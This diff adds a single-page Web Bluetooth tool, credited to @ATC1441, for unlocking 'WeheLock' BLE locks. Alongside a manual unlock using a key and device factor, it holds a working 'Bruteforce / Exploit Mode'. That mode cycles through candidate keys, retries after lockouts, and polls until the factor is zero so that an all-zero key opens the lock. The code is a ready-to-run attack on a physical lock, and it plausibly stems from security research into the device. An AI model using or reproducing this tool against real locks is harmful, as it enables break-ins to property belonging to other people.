@@ -1,0 +1,195 @@
+<!DOCTYPE html>
+<html lang="de">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>ATC1441 WeheLock Unlocker</title>
+    <style>
+        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; padding: 10px; background: #121212; color: #e0e0e0; margin: 0; }
+        .container { max-width: 600px; margin: auto; }
+        .card { background: #1e1e1e; padding: 15px; border-radius: 12px; margin-bottom: 15px; border: 1px solid #333; }
+        button { width: 100%; padding: 14px; margin: 8px 0; border: none; border-radius: 8px; cursor: pointer; font-weight: bold; font-size: 16px; transition: opacity 0.2s; }
+        button:active { opacity: 0.7; }
+        button:disabled { background: #444 !important; color: #888; cursor: not-allowed; }
+        #log { font-family: 'Courier New', monospace; background: #000; padding: 10px; height: 200px; overflow-y: auto; color: #00ff00; font-size: 12px; border: 1px solid #444; border-radius: 5px; }
+        .btn-connect { background: #007bff; color: #fff; }
+        .btn-unlock { background: #28a745; color: #fff; }
+        .btn-brute-start { background: #dc3545; color: #fff; }
+        .btn-breaking-start { background: #ff9800; color: #fff; }
+        .btn-brute-stop { background: #6c757d; color: #fff; }
+        .stat-grid { display: grid; grid-template-columns: repeat(3, 1fr); gap: 10px; margin-top: 15px; text-align: center; }
+        .stat-value { font-size: 18px; font-weight: bold; color: #00e5ff; margin-top: 5px; }
+        .stat-label { font-size: 10px; color: #888; text-transform: uppercase; }
+        input[type=text] { width: 100%; box-sizing: border-box; background: #000; color: #0f0; border: 1px solid #444; padding: 12px; border-radius: 6px; font-family: monospace; font-size: 16px; margin-bottom: 10px; }
+        h1 { font-size: 1.4rem; margin: 10px 0; }
+        h3 { margin: 0 0 10px 0; font-size: 1.1rem; }
+    </style>
+</head>
+<body>
+<div class="container">
+    <h1>WeheLock <small style="font-size:12px; color:#888;"> - Mobile Control by @ATC1441</small></h1>
+
+    <div class="card">
+        <button id="btnConnect" class="btn-connect">&#128394; Connect BLE</button>
+        <div id="connStatus" style="text-align: center; font-size: 12px; margin-top: 5px; color:#888;">Status: Disconnected</div>
+        <div class="stat-grid">
+            <div><div class="stat-label">Factor</div><div class="stat-value" id="factorVal">--</div></div>
+            <div><div class="stat-label">Battery</div><div class="stat-value" id="batteryVal">--%</div></div>
+            <div><div class="stat-label">Status</div><div class="stat-value" id="unlockStatus">--</div></div>
+        </div>
+    </div>
+
+    <div class="card">
+        <h3>&#128273; Key Configuration</h3>
+        <input type="text" id="keyInput" value="0409070305020906">
+        <button id="btnUnlock" class="btn-unlock" disabled>&#128275; Send Unlock</button>
+    </div>
+
+    <div class="card">
+        <h3 style="color:#dc3545;">&#9760; Bruteforce / Exploit Mode</h3>
+        <label style="display:block; margin-bottom: 10px; font-size: 14px;"><input type="checkbox" id="keepKeyCheckbox"> Keep current key</label>
+        <button id="btnBruteStart" class="btn-brute-start" disabled>Start Bruteforce</button>
+        <button id="btnBreakingStart" class="btn-breaking-start" disabled>Start Exploit Mode</button>
+        <button id="btnBruteStop" class="btn-brute-stop" disabled>Stop</button>
+        <div style="margin-top:10px; font-size: 12px; word-break: break-all;">Testing: <span id="bruteCurrentKey" style="color:#ffeb3b; font-family:monospace;">--</span></div>
+    </div>
+
+    <div class="card">
+        <div style="display:flex; justify-content:space-between; align-items:center; margin-bottom: 10px;">
+            <h3>&#128225; Traffic Log</h3>
+            <button onclick="document.getElementById('log').innerHTML=''" style="width: auto; padding: 5px 10px; font-size: 12px; background:#333;">Clear</button>
+        </div>
+        <div id="log"></div>
+    </div>
+</div>
+
+<script>
+const BASE62 = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
+const SERVICE_UUID = '6e400001-b5a3-f393-e0a9-e50e24dcca9e';
+const WRITE_UUID   = '6e400002-b5a3-f393-e0a9-e50e24dcca9e';
+const NOTIFY_UUID  = '6e400003-b5a3-f393-e0a9-e50e24dcca9e';
+
+let writeChar = null, isBruteforcing = false, isBreakingMode = false, pendingManualUnlock = false;
+let currentBruteKey = [0,0,0,0,0,0,0,0];
+
+function log(msg, color = '#00ff00') {
+    const el = document.getElementById('log');
+    const time = new Date().toLocaleTimeString('en-US', { hour12: false, hour: '2-digit', minute: '2-digit', second: '2-digit' });
+    el.innerHTML += `<div style="color:${color}">[${time}] ${msg}</div>`;
+    el.scrollTop = el.scrollHeight;
+}
+
+function toHex(bytes) { return Array.from(bytes).map(b => b.toString(16).padStart(2,'0').toUpperCase()).join(' '); }
+
+function getKeyFromInput() {
+    const raw = document.getElementById('keyInput').value.replace(/\s+/g, '');
+    let bytes = [];
+    for (let i = 0; i < 16; i += 2) bytes.push(parseInt(raw.substr(i, 2), 16) || 0);
+    log(`Key Parsing: Input='${raw}' -> Bytes=[${bytes.map(b => b.toString(16).padStart(2,'0')).join('')}]`, '#aaa');
+    return bytes;
+}
+
+function computeToken(key, factor) {
+    const result = new Uint8Array(13);
+    for (let i = 0; i < 8; i++) {
+        const product = (key[i] * factor) & 0xFF; 
+        const idx     = (product >> 2) % 62;
+        result[i]     = BASE62.charCodeAt(idx);
+    }
+    result[8] = result[9] = result[10] = result[11] = 0x41;
+    const crcProd = (factor * factor) & 0xFF;
+    result[12]    = BASE62.charCodeAt((crcProd >> 2) % 62);
+    return result;
+}
+
+function handleNotification(event) {
+    const b = new Uint8Array(event.target.value.buffer);
+    log(`RX: ${toHex(b)}`, '#00e5ff');
+
+    if (b[0] !== 0x55) return;
+
+    if (b[1] === 0x30) {
+        document.getElementById('factorVal').textContent = b[2].toString(16).toUpperCase();
+        document.getElementById('batteryVal').textContent = b[3] + '%';
+        
+        if (isBreakingMode && b[2] === 0x00) {
+            log("Exploit Mode: Found 0, using 00 key", "#ff9800");
+            currentBruteKey = [0,0,0,0,0,0,0,0];
+            sendUnlock(b[2], currentBruteKey);
+            isBreakingMode = false;
+        } else if (isBreakingMode) {
+            log("Exploit Mode: Factor " + b[2] + " not 0, retrying...", "#ff9800");
+            setTimeout(() => sendStatusRequest(true), 50);
+        } else if (isBruteforcing) {
+            sendUnlock(b[2], currentBruteKey, true);
+        } else if (pendingManualUnlock) { 
+            pendingManualUnlock = false; sendUnlock(b[2], getKeyFromInput()); 
+        }
+    } 
+    else if (b[1] === 0x31) {
+        const status = b[2];
+        document.getElementById('unlockStatus').textContent = status === 0x01 ? 'SUCCESS' : status === 0x00 ? 'INVALID' : 'BLOCKED';
+        log(`-> Status: ${status === 0x01 ? 'SUCCESS' : status === 0x00 ? 'INVALID' : 'BLOCKED'}`, status === 0x01 ? '#28a745' : '#dc3545');
+        
+        if (isBruteforcing) {
+            if (status === 0x01) {
+                isBruteforcing = false;
+                alert("Success! Key: " + currentBruteKey.map(x=>x.toString(16).padStart(2,'0')).join(''));
+            } else if (status === 0x00) {
+                if (!document.getElementById('keepKeyCheckbox').checked) incrementBruteKey();
+                setTimeout(() => sendStatusRequest(true), 50);
+            } else if (status === 0x02) {
+                log("!!! BLOCKED !!! Waiting 5s...", '#ff9800');
+                setTimeout(() => sendStatusRequest(true), 5000);
+            }
+        }
+    }
+}
+
+async function sendStatusRequest(silent = false) {
+    const p = new Uint8Array([0x55, 0x30]);
+    if(!silent) log(`TX Status Req: ${toHex(p)}`, '#888');
+    await writeChar.writeValueWithoutResponse(p);
+}
+
+async function sendUnlock(factor, key, silent = false) {
+    const p = new Uint8Array(15);
+    p[0] = 0x55; p[1] = 0x31;
+    p.set(computeToken(key, factor), 2);
+    log(`TX Unlock: ${toHex(p)}`, '#ffeb3b');
+    await writeChar.writeValueWithoutResponse(p);
+}
+
+function incrementBruteKey() {
+    for (let i = 7; i >= 0; i--) {
+        currentBruteKey[i]++;
+        if (currentBruteKey[i] > 9) currentBruteKey[i] = 0;
+        else break;
+    }
+    const newStr = currentBruteKey.map(x=>x.toString(16).padStart(2,'0')).join('');
+    document.getElementById('bruteCurrentKey').textContent = newStr;
+    log(`Next Brute Key: ${newStr}`, '#555');
+}
+
+document.getElementById('btnConnect').onclick = async () => {
+    try {
+        const device = await navigator.bluetooth.requestDevice({ filters: [{services: [SERVICE_UUID]}], optionalServices: [SERVICE_UUID] });
+        const server = await device.gatt.connect();
+        const service = await server.getPrimaryService(SERVICE_UUID);
+        writeChar = await service.getCharacteristic(WRITE_UUID);
+        const notifyChar = await service.getCharacteristic(NOTIFY_UUID);
+        await notifyChar.startNotifications();
+        notifyChar.addEventListener('characteristicvaluechanged', handleNotification);
+        document.getElementById('btnUnlock').disabled = document.getElementById('btnBruteStart').disabled = document.getElementById('btnBreakingStart').disabled = false;
+        document.getElementById('connStatus').textContent = "Connected to: " + device.name;
+        log("Connected successfully", "#28a745");
+    } catch(err) { log("Error: " + err, "#dc3545"); }
+};
+
+document.getElementById('btnUnlock').onclick = () => { pendingManualUnlock = true; sendStatusRequest(); };
+document.getElementById('btnBruteStart').onclick = () => { isBruteforcing = true; document.getElementById('btnBruteStop').disabled = false; currentBruteKey = getKeyFromInput(); log("Bruteforce process started", "#ffeb3b"); document.getElementById('bruteCurrentKey').textContent = currentBruteKey.map(x=>x.toString(16).padStart(2,'0')).join(''); sendStatusRequest(true); };
+document.getElementById('btnBreakingStart').onclick = () => { isBreakingMode = true; document.getElementById('btnBruteStop').disabled = false; log("Breaking Mode started", "#ff9800"); sendStatusRequest(true); };
+document.getElementById('btnBruteStop').onclick = () => { isBruteforcing = false; isBreakingMode = false; document.getElementById('btnBruteStop').disabled = true; log("Process stopped", "#ff0000"); };
+</script>
+</body>
+</html>
